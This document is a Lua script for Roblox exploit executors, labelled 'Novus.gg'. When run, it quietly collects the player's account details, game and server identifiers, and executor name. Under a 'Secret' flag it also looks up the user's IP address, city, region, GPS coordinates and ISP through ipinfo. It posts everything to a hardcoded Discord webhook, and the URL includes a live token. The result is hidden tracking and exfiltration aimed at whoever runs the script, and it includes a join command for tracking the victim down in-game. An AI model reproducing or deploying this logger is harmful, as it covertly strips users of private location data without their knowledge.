getgenv().whscript = "Novus.gg"       
getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1449154536391577744/Px1xO395eIHGGQ2sRPhwQ7JM7o3-qs9pTZ3pGwR8o6p9yK5cOxHTSEjsNzOnR_FVplCZ"  
getgenv().ExecLogSecret = true            

local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
local player = game:GetService("Players").LocalPlayer
folder.Parent = gethui()
local players = game:GetService("Players")
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
local completeTime = os.date("%Y-%m-%d %H:%M:%S")
local workspace = game:GetService("Workspace")
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local commonLoadTime = 5
task.wait(commonLoadTime)
local pingThreshold = 100
local serverStats = game:GetService("Stats").Network.ServerStatsItem
local dataPing = serverStats["Data Ping"]:GetValueString()
local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
local url = getgenv().webhookexecUrl
local data = {
	["content"] = "",
	["embeds"] = {
		{
			["title"] = "🚀 " .. player.Name .. " executed " .. getgenv().whscript .. " at " .. completeTime,
			["description"] = "",
			["type"] = "rich",
			["color"] = tonumber(3447003),
			["fields"] = {
				{
					["name"] = "👤 **Player Details**",
					["value"] = "```🧸 Username: " ..
                            player.Name ..
                                "\n📝 Display Name: " ..
                                    player.DisplayName ..
                                        "\n🆔 UserID: " ..
                                            userid ..
                                                "\n🔗 Profile: (https://www.roblox.com/users/" ..
                                                                    userid .. "/profile) \n🗓️ Account Age: " ..
																		player.AccountAge ..
																			" days \n📅 Account Created: " ..
																				os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
					["inline"] = false
				},
				{
					["name"] = "🎮 **Game Details**",
					["value"] = "```🏷️ Game Name: " ..
                            gameName ..
                                "\n🆔 Game ID: " ..
                                    gameid ..
                                        "\n🔗 Game Link (https://www.roblox.com/games/" ..
                                            gameid .. ")```",
					["inline"] = false
				},
				{
					["name"] = "🕹️ **Server Info**",
					["value"] = "```👥 Players in Server: " ..
                            playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
					["inline"] = true
				},
				{
					["name"] = "📡 **Network Info**",
					["value"] = "```📶 Ping: " .. pingValue .. " ms```",
					["inline"] = true
				},
				{
					["name"] = "🖥️ **System Info**",
					["value"] = "```⚙️ Executor: " .. identifyexecutor() .. "```",
					["inline"] = true
				},
				{
					["name"] = "🪧 **Join Script**",
					["value"] = "```lua\n" .. snipePlay .. "```",
					["inline"] = false
				}
			},
			["thumbnail"] = {
				["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
			},
			["footer"] = {
				["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
				["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
			}
		}
	}
}

if getgenv().ExecLogSecret then
	local ip = game:HttpGet("https://api.ipify.org")
	local iplink = "https://ipinfo.io/" .. ip .. "/json"
	local ipinfo_json = game:HttpGet(iplink)
	local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
	table.insert(
            data.embeds[1].fields,
            {
		["name"] = "**`(🤫) Secret`**",
		["value"] = "||(👣) IP Address: " ..
                    ipinfo_table.ip ..
                        "||\n||(🌆) Country: " ..
                            ipinfo_table.country ..
                                "||\n||(🪟) GPS Location: " ..
                                    ipinfo_table.loc ..
                                        "||\n||(🏙️) City: " ..
                                            ipinfo_table.city ..
                                                "||\n||(🏡) Region: " ..
                                                    ipinfo_table.region ..
                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
	}
        )
end
local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {
	["content-type"] = "application/json"
}
request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
local abcdef = {
	Url = url,
	Body = newdata,
	Method = "POST",
	Headers = headers
}
request(abcdef)
